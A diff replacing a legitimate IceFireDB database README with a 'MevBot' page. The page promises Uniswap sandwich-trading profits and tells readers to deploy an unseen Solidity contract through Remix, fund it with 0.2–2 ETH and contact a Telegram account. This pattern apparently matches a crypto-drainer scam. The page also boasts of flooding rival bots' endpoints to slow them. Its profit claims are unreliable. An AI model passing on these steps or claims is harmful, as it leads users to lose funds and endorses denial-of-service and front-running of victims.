@@ -1,196 +1,103 @@
-<p align="center">
-<img 
-    src="logo.png" 
-    height="200" border="0" alt="IceFireDB">
-</p>
-
-# IceFireDB - Decentralized Database Infrastructure
-![test](https://github.com/IceFireDB/IceFireDB/actions/workflows/test.yml/badge.svg)
-![build](https://github.com/IceFireDB/IceFireDB/actions/workflows/build.yml/badge.svg)
-[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2FIceFireDB%2FIceFireDB.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2FIceFireDB%2FIceFireDB?ref=badge_shield)
-
-- [IceFireDB - Decentralized Database Infrastructure](#icefiredb---decentralized-database-infrastructure)
-- [Decentralized database engine](#decentralized-database-engine)
-- [Documentation center](#documentation-center)
-- [Project composition](#project-composition)
-  - [IceFireDB-SQLite](#icefiredb-sqlite)
-  - [IceFireDB-SQLProxy](#icefiredb-sqlproxy)
-  - [IceFireDB-Redis-Proxy](#icefiredb-redis-proxy)
-  - [IceFireDB-PubSub](#icefiredb-pubsub)
-  - [IceFireDB-NoSQL](#icefiredb-nosql)
-  - [NoSQL Command support](#nosql-command-support)
-- [System Design](#system-design)
-- [Quick Start](#quick-start)
-- [Performance](#performance)
-- [Project direction](#project-direction)
-- [Thanks support](#thanks-support)
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
 
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-Based on cutting-edge computer science, the IceFireDB project integrates new ideas and research in the fields of message passing, event instruction processing, data consistency and replication, decentralized network, reliable data storage, high-performance network framework, etc.The team of researchers and engineers at IceFireDB combines the cutting-edge ideas from distributed systems and concurrent databases. These ideas combine collision-free replication data types (CRDT) and decentralized appendix-only logs, which can be used to simulate the variable sharing state between peers in P2P applications to create a new data infrastructure with high security, high performance and low latency.
-
-The core of IceFireDB architecture is geographically distributed event source and decentralized Log source, with log-level CRDT replication.In order to realize the consistency of replication, IceFireDB provides a stable decentralized networking model, which allows the combination of public networks among different sites. Multiple IceFireDB nodes can be run inside each site, and RAFT network can be formed between nodes, which ensures the data consistency and stable storage within the same site.
-
-![image](./imgs/icefiredb_dc_logs_sync.png)
+## For demonstration purposes, other wallets will be used for testing below.
 
 
-# Decentralized database engine
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
 
-<p align="center">
-<img 
-    src="./imgs/IceFireDB_helps_applications_achieve_data_decentralization.png" 
-     alt="icefiredb-bridge">
-</p>
+## Update 08.05.2023 (Result)
 
-IceFireDB is a database built for web3 and web2. The core mission of the project is to help applications quickly achieve decentralization and data immutability. At present, the storage layer supports various storage methods such as disk, OSS, and IPFS. The protocol layer currently supports SQL and RESP protocols, and will support GraphQL protocols in the future.A blockchain fusion layer based on immutable transparent logs and Ethereum is under construction to support integration with higher-level decentralized computing platforms and applications as well as identity, financial assets, intellectual property and sidechain protocols. IceFireDB strives to fill the gap of the decentralized stack, making the data ecology of web3 applications more complete, and making it easier for web2 applications to achieve decentralization and data immutability.
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
 
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
 
-<p align="center">
-<img 
-    src="./imgs/Application_architecture_based_on_IceFireDB.png"
-     alt="project_purpose">
-</p>
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
 
-1. High performance.
-2. Support LSM disk, OSS, IPFS underlying storage.
-3. Distributed consistency（support raft\p2p-crdt\ipfs-log mode）
-4. Based on IPFS decentralized storage, build a persistent data distributed storage layer.（beta version）
-5. Support P2P automatic networking, build decentralized NoSQL and SQL data synchronization.（beta version）
-6. Support decentralized consistent kv storage engine ([icefiredb-crdt-kv](https://github.com/IceFireDB/icefiredb-crdt-kv) and [icefiredb-ipfs-log](https://github.com/IceFireDB/icefiredb-ipfs-log) ).（beta version）
-7. Integrate with [NATS](https://nats.io/) for high-performance decentralized networking, improving edge network efficiency and reliability. (under support)
-8. Support KV and SQL immutable storage engine (combined with [immudb](https://github.com/codenotary/immudb) storage engine). (under support)
-9.  Supports scalable, auditable, and high-performance tamper-resistant logging (combined with [qed](https://github.com/BBVA/qed))
-10. Build an immutable transparent log witness layer between web2 and web3, build a data hot and cold hybrid structure and an immutable data bridge layer. (inspired by google trillian-witness and IPLD) 
-11. Support kv metadata layer and mixed storage structure of hot and cold.
-12. More advanced cache implementation, faster LSM persistent storage（Source of ideas: https://dl.acm.org/doi/10.1145/3448016.3452819 ）（Support the performance improvement of blockchain full-node）
+The bot sends transactions and monitors the Uniswap v2 Mempool.
 
-# Documentation center
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
 
-<p align="center">
-<img 
-    src="./imgs/IceFireDB_Architecture_new.png" 
-     alt="IceFireDB_Architecture">
-</p>
+Finally, the ETH is returned to the contract for withdrawal.
 
-[**Documentation center**](https://www.icefiredb.xyz/icefiredb_docs/) : https://www.icefiredb.xyz/icefiredb_docs
+This bot performs all of these functions faster than 99% of other bots.
 
-# Project composition
+*But ser, there are open source bots that do the same*
 
-## [IceFireDB-SQLite](https://github.com/IceFireDB/IceFireDB/tree/main/IceFireDB-SQLite)
-IceFireDB-SQLite database is a decentralized SQLite database. Provide a convenient mechanism to build a global distributed database system. Support users to write data to IceFireDB-SQLite using MySQL protocol. IceFireDB-SQLite stores the data in the SQLite database and synchronizes the data among the nodes in the P2P automatic network.
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
 
-## [IceFireDB-SQLProxy](https://github.com/IceFireDB/IceFireDB/tree/main/IceFireDB-SQLProxy)
+*Wen increase aggressiveness ?*
 
-IceFireDB-SQLProxy is a decentralized SQL database networking system that helps web2 traditional SQL database data decentralization. Provide a convenient mechanism to build a globally distributed storage system with automatic networking. Commands are automatically synchronized between IceFireDB-SQLProxy in the network, and each IceFireDB-SQLProxy writes data to MySQL storage.
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
 
-Decentralized networking through IceFireDB-SQLProxy provides web2 program read and write support for SQL, enabling decentralized data synchronization for MySQL database read and write scenarios commonly used in web2 applications.
+*What did I learn?*
 
-## [IceFireDB-Redis-Proxy](https://github.com/IceFireDB/IceFireDB/tree/main/IceFireDB-Redis-Proxy)
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
 
-IceFireDB-Redis-proxy database proxy adds decentralization wings to traditional redis databases. Provide a convenient mechanism to build a globally distributed storage system with automatic networking. The instructions are automatically synchronized between the networked redis agents, and the redis agent writes data to the cluster or single-point redis storage. Through the decentralized middleware network proxy, decentralized data synchronization can be enabled for the Redis database commonly used in web2 applications.
+*So why stop?*
 
-## [IceFireDB-PubSub](https://github.com/IceFireDB/IceFireDB/tree/main/IceFireDB-PubSub)
-
-IceFireDB-PubSub is a high performance, high availability and decentralized subscription system.It can seamlessly migrate web2 applications using redis publish and subscribe into a decentralized p2p subscription network.
-
-## [IceFireDB-NoSQL](https://github.com/IceFireDB/IceFireDB)
-It supports distributed raft disk Redis database mode in web2 mode, and also supports decentralized IPFS storage mode.
-
-## NoSQL Command support
-
-| Strings  | Hashes |Lists | Sets |Sorted Sets |
-| ------------- | ------------- | ------------- |------------- |------------- |
-| APPEND  | HSET|RPUSH | SADD| ZADD|
-| BITCOUNT | HGET |LPOP  | SCARD| ZCARD|
-| BITOP | HDEL |LINDEX  | SDIFF| ZCOUNT|
-| BITPOS | HEXISTS |LPUSH  | SDIFFSTORE| ZREM|
-| DECR| HGETALL |RPOP | SINTER| ZCLEAR|
-| DECRBY | HINCRBY |LRANGE  | SINTERSTORE| ZRANK|
-| DEL | HKEYS |LSET  | SISMEMBER| ZRANGE|
-| EXISTS  | HLEN  |LLEN  | SMEMBERS| ZREVRANGE|
-| GET | HMGET|RPOPLPUSH  | SREM| ZSCORE|
-| GETBIT | HMSET |LCLEAR  | SUNION|ZINCRBY |
-| SETBIT | HSETEX  |LCLEAR  | SUNIONSTORE| ZREVRANK|
-| GETRANGE| HSTRLEN  |LMCLEAR  | SCLEAR|ZRANGEBYSCORE |
-| GETSET | HVALS  |LEXPIRE  |SMCLEAR | ZREVRANGEBYSCORE|
-| INCR | HCLEAR  |LEXPIREAT  |SEXPIRE | ZREMRANGEBYSCORE|
-| EXISTS  | HMCLEAR  |LKEYEXISTS  | SEXPIRE| ZREMRANGEBYRANK|
-| GET | HEXPIRE |LTRIM  |SEXPIREAT | |
-| GETBIT | HEXPIREAT |LTTL  |STTL | |
-| SETBIT | HKEYEXIST |  |SPERSIST | |
-| GETRANGE| HTTL  |   |SKEYEXISTS | |
-| GETSET |   |  | | |
-| INCRBY |   |  | | |
-| GET |  |  | | |
-| MGET |  |  | | |
-| MSET |   |  | | |
-| SET|   |  | | |
-| SETEX |   |  | | |
-| SETEXAT |   |  | | |
-| SETRANGE |   |  | | |
-| EXPIRE|   |  | | |
-| EXPIREAT |   |  | | |
-| TTL |   |  | | |
-
-# System Design
-**IceFireDB refines and implements the following important system components.**
-
-| System components | describe | technology used |
-| ------------- | ------------- | ------------- |
-| **[Network layer](https://www.icefiredb.xyz/icefiredb_docs/icefiredb/icefiredb-nosql/designs/network/)**  |  1. RAFT guarantees data consistency within a single availability zone. <br />2. P2P network construction decentralized database communication. <br />3. NATS is a new network layer being built.  |P2P、RAFT、NATS  |
-| **[Storage layer](https://www.icefiredb.xyz/icefiredb_docs/icefiredb/icefiredb-nosql/designs/storage/)** | Many types of storage are currently supported. Under the codec computing layer, we abstract the KV storage driver layer, which is compatible with different storage engines of web2 and web3.  |goleveldb、badger、IPFS、CRDT、IPFS-LOG、OSS  |
-| **[Protocol layer](https://www.icefiredb.xyz/icefiredb_docs/icefiredb/icefiredb-nosql/designs/protocol/)**| Based on the codec layer, we have built a protocol layer. A good communication protocol allows more applications to easily access the IceFireDB data network. Currently, we support the Redis-RESP NoSQL protocol and the MySQL protocol.  |RESP、SQL |
-| **[Codec layer](https://www.icefiredb.xyz/icefiredb_docs/icefiredb/icefiredb-nosql/designs/codec/)**| The codec layer is the core of our system. For NoSQL scenarios, any data type will be abstracted into a KV storage model. With the flexible coding layer, we can build rich data operation structures and instructions, such as hash, sets, strings, etc.  |KV、Strings、Hashes、Lists、Sorted Sets、Sets、SQL、PubSub  |
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
 
 
-# Quick Start 
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
 
-[https://www.icefiredb.xyz/icefiredb_docs/icefiredb/icefiredb-nosql/quick_start/](https://www.icefiredb.xyz/icefiredb_docs/icefiredb/icefiredb-nosql/quick_start/)
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
 
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
 
-# Performance 
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
 
-**leveldb driver**
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
 
-```shell
-corerman@ubuntu:~/DATA/ICODE/GoLang/IceFireDB$ redis-benchmark  -h 127.0.0.1 -p 11001 -n 10000000 -t set,get -c 512 -P 512 -q
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
 
-SET: 253232.12 requests per second
-GET: 2130875.50 requests per second
-```
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
 
-# Project direction
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
 
-IceFireDB originated from the distributed NoSQL database in the web2 scenario. We will continue to support the web2 distributed NoSQL database, while investing more energy in the direction of web3 and web2 decentralized databases. We are very grateful to our community partners for their continued interest, the community has been our driving force.
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
 
-# Thanks support
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
 
- **I stood on the shoulders of giants and did only simple things. Thank you for your attention.**
-
-* https://github.com/tidwall/uhaha
-* https://github.com/syndtr/goleveldb
-* https://github.com/dgraph-io/ristretto
-* https://github.com/ledisdb/ledisdb
-* https://github.com/dgraph-io/badger
-* https://github.com/ipfs/ipfs
-* https://github.com/libp2p
-
-
-<table>
-  <tr>
-    <td align="center"><a href="https://protocol.ai/"><img src="https://user-images.githubusercontent.com/34047788/188373221-4819fd05-ef2f-4e53-b784-dcfffe9c018c.png" width="100px;" alt=""/><br /><sub><b>Protocol Labs</b></sub></a></td>
-    <td align="center"><a href="https://filecoin.io/"><img src="https://user-images.githubusercontent.com/34047788/188373584-e245e0bb-8a3c-4773-a741-17e4023bde65.png" width="100px;" alt=""/><br /><sub><b>Filecoin</b></sub></a></td>
-  <td align="center"><a href="https://fvm.filecoin.io/"><img src="https://user-images.githubusercontent.com/34047788/220075045-48286b37-b708-4ecf-94f5-064c55e79fa3.png" width="110px;" alt="FVM"/><br /><sub><b>FVM</b></sub></a></td>
-  <td align="center"><a href="https://libp2p.io/"><img src="https://github.com/IceFireDB/.github/assets/34047788/36e39958-76ad-4b3a-96e1-1614e87ac1a3" width="100px;" alt="libp2p"/><br /><sub><b>libp2p</b></sub></a></td>  
-</tr>
-</table>
-
-
-**License**
-
-[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2FIceFireDB%2FIceFireDB.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2FIceFireDB%2FIceFireDB?ref=badge_large)
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
 
 
-**Disclaimers**
 
-When you use this software, you have agreed and stated that the author, maintainer and contributor of this software are not responsible for any risks, costs or problems you encounter. If you find a software defect or BUG, please submit a patch to help improve it!
+
+
+
+
+
+
